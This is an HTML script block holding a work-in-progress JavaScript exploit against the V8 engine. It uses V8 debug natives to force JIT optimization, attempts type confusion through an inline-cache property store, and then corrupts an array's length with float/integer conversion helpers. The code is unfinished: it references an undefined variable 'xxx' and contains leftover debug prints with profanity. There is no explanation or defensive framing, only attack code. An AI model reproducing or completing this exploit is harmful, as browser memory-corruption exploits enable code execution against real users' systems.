<script>
    var arr = [2.2, 2.2];
    function exp() {
        var dv = new DataView(new ArrayBuffer(0x10));
        function gc() {
            for (var i = 0; i < 0x100; i++) new Array(0x200);
        }
        const to_hex = num => {
            return (num >> 0n).toString(16);
        }
        function biglow(b) {
            dv.setBigUint64(0, b);
            return (dv.getUint32(0, true));
        }
        function bighi(b) {
            dv.setBigUint64(0, b);
            return (dv.getUint32(4, true));
        }
        function f2big(f) {
            dv.setFloat64(0, f);
            return (dv.getBigUint64(0, true));
        }
        function big2f(b) {
            dv.setBigUint64(0, b, true);
            return dv.getFloat64(0);
        }
        function flow(f) {
            dv.setFloat64(0, f, true);
            return (dv.getUint32(0, true));
        }
        function fhi(f) {
            dv.setFloat64(0, f, true);
            return (dv.getUint32(4, true));
        }
        function i2f(low, hi) {
            dv.setUint32(0, low, true);
            dv.setUint32(4, hi, true);
            return dv.getFloat64(0, true);
        }
        function majorGc() {
            var arr_stack = [];
            for (let i = 0; i < 80; i++) {
                try {
                    arr_stack.push(new ArrayBuffer(0x7ff00000000 + i));
                } catch (msg) {
                    break;
                }
            }
        }
        function main() {
            var arr = [1.1, 1.1];
            function setInnerProperty(o, obj) {
                for (let m = 0; m < 0x100000; m++) {
                    o.inner.foo = obj;
                }
            }
            // % PrepareFunctionForOptimization(setInnerProperty);
            // % OptimizeFunctionOnNextCall(setInnerProperty);
            function setaddr(str, addr, flag) {
                var o = {
                    inner: {
                        ['foo']: 1.5
                    }
                };
                eval(str);// eval防止内联
                if (flag) {
                    console.log("fuckme");
                    console.log(o.inner.foo)
                }
                o.inner.foo = addr;
                // return o.inner.foo;
                return arr;
            };  
            % PrepareFunctionForOptimization(setaddr);
            // optimize setInnerProperty
            setaddr("setInnerProperty(o, arr,false);", xxx);
            majorGc();
            setaddr("setInnerProperty(o, arr,false);", xxx);
            majorGc();
            % OptimizeFunctionOnNextCall(setaddr);
            // % DebugPrint(arr);
            // 
            let o = setaddr("setInnerProperty(o, arr,true);", xxx);
            %DebugPrint("fuck");
            % DebugPrint(o);
            alert("go to change length");
            o[0]=i2f(flow(o[0]),0x40);
            alert("check Length");
        }
        main();
    };
    exp();
</script>